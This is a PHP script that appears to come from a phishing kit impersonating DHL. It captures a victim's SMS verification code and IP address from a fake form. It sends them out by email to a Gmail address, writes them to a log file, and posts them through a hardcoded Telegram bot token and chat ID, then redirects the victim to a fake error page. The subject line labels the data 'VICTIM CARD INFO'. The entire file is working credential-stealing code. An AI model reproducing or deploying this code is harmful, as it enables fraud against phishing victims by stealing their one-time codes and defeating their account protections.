<?php
include("../../system/os.php");
include "../email.php";
$date = date('m/d/Y h:i:s a', time());
$ip = getenv("REMOTE_ADDR");
$link = $_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'] ;
if(($_POST['jeansms'] != "") )
{
$hostname = gethostbyaddr($ip);
$message .= "# SMS CODE           : ".$_POST['jeansms']."\n";
$message .= "# IP INFO            : $ip\n";
$send = "lebzozizo@gmail.com";
$subject = "📦 NEW DHL VICTIM CARD INFO FROM = $ip";
$headers = "From: ORB <dhl@server266.web-hosting.com>";
mail($send,$subject,$message,$headers);
file_put_contents("../../nj.txt", $message, FILE_APPEND);
function telegram_send($message) {
    $curl = curl_init();
    $api_key  = '1244123994:AAEG5OQvqUXTvyMmc4QWOvgYKIxy1ofq55g';
    $chat_id  = '1128003836';
    $format   = 'HTML';
    curl_setopt($curl, CURLOPT_URL, 'https://api.telegram.org/bot'. $api_key .'/sendMessage?chat_id='. $chat_id .'&text='. $message .'&parse_mode=' . $format);
    curl_setopt($curl, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    $result = curl_exec($curl);
    curl_close($curl);
    return true;
}


telegram_send(urlencode($message));
echo "<meta http-equiv='refresh' content='0; url=../../loadingerror.php'/>";
}
	else {
     echo "<meta http-equiv='refresh' content='0; ../../loadingerror.php' />";
}

?>